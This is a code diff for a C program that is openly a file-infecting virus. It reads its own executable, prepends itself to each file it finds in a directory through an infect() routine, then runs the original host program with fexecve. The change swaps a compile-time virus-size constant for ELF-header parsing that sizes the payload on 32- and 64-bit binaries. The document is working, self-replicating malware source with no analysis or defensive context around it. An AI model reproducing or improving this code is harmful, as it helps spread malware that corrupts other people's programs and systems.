@@ -3,6 +3,7 @@
 #endif
 
 #include <assert.h>
+#include <elf.h>
 #include <errno.h>
 #include <dirent.h>
 #include <fcntl.h>
@@ -18,21 +19,36 @@
 #include <sys/types.h>
 #include <unistd.h>
 
-static_assert(sizeof(size_t) >= sizeof(off_t), "off_t must fit in size_t");
-
-#ifndef VIRUS_SIZE
-#error "Please define VIRUS_SIZE"
+#ifndef __ELF__
+#error "ELF only"
 #endif
 
-enum {
-    virus_size = VIRUS_SIZE,
-};
+static_assert(sizeof(size_t) >= sizeof(off_t), "off_t must fit in size_t");
 
-static_assert(virus_size > 0, "VIRUS_SIZE must be positive");
+#include "compute-virus-size-32.c"
+#include "compute-virus-size-64.c"
 
-typedef struct {
-    char content[virus_size];
-} virus_t;
+off_t compute_virus_size(FILE *file) {
+    unsigned char identifier[EI_NIDENT];
+
+    if (fread(identifier, sizeof(identifier), 1, file) == 0) {
+        off_t result = -errno;
+        assert(ferror(file));
+        return result;
+    }
+
+    rewind(file);
+
+    switch (identifier[EI_CLASS]) {
+        case ELFCLASS32:
+            return compute_virus_size_32(file);
+        case ELFCLASS64:
+            return compute_virus_size_64(file);
+        default:
+            assert(false);
+            return -ENOEXEC;
+    }
+}
 
 size_t sendfile_all(int out_fd, int in_fd, size_t remaining) {
     while (remaining > 0) {
@@ -43,7 +59,7 @@ size_t sendfile_all(int out_fd, int in_fd, size_t remaining) {
     return remaining;
 }
 
-int infect(const virus_t *virus, const char *path) {
+int infect(const char *virus, size_t virus_size, const char *path) {
     int result = 0;
 
     int fd = open(path, O_RDWR);
@@ -90,10 +106,20 @@ exit:
 int main(int argc, char *const argv[], char *const envp[]) {
     (void)argc;
 
-    int exe_fd = open("/proc/self/exe", O_RDONLY);
-    if (exe_fd == -1) {
+    char buffer[BUFSIZ];
+    FILE *exe_file = fopen("/proc/self/exe", "r");
+    if (!exe_file) {
         fprintf(stderr, "could not open /proc/self/exe for reading: %s\n", strerror(errno));
         goto exit;
+    }
+    setbuf(exe_file, buffer);
+    int exe_fd = fileno(exe_file);
+    assert(exe_fd != -1);
+
+    off_t virus_size = compute_virus_size(exe_file);
+    if (virus_size < 0) {
+        fprintf(stderr, "could not determine size: %s\n", strerror(-virus_size));
+        goto close_exe;
     }
 
     struct stat exe_stat;
@@ -103,7 +129,7 @@ int main(int argc, char *const argv[], char *const envp[]) {
     }
     assert(exe_stat.st_size >= virus_size);
 
-    virus_t *virus = mmap(NULL, virus_size, PROT_READ, MAP_SHARED, exe_fd, 0);
+    char *virus = mmap(NULL, virus_size, PROT_READ, MAP_SHARED, exe_fd, 0);
     if (virus == MAP_FAILED) {
         fprintf(stderr, "cannot memory-map %zu-byte virus: %s\n", 
                 (size_t) virus_size, strerror(errno));
@@ -118,7 +144,7 @@ int main(int argc, char *const argv[], char *const envp[]) {
                 if (!result) break;
 
                 posix_madvise(virus, virus_size, POSIX_MADV_SEQUENTIAL);
-                error = infect(virus, entry.d_name);
+                error = infect(virus, virus_size, entry.d_name);
                 if (error) {
                     fprintf(stderr, "cannot infect %s: %s\n", entry.d_name, strerror(error));
                 }
@@ -133,7 +159,7 @@ int main(int argc, char *const argv[], char *const envp[]) {
 
     off_t actual_size = exe_stat.st_size - virus_size;
     if (actual_size == 0) {
-        close(exe_fd);
+        fclose(exe_file);
         return 0;
     }
 
@@ -193,7 +219,7 @@ int main(int argc, char *const argv[], char *const envp[]) {
 
     close(tmp_fd);
     unlink(tmp_path);
-    close(exe_fd);
+    fclose(exe_file);
     fexecve(tmp_fd2, argv, envp);
     fprintf(stderr, "cannot execute %s: %s\n", tmp_path, strerror(errno));
     close(tmp_fd2);
@@ -204,7 +230,7 @@ close_tmp:
     unlink(tmp_path);
 
 close_exe:
-    close(exe_fd);
+    fclose(exe_file);
     
 exit:
     return EXIT_FAILURE;
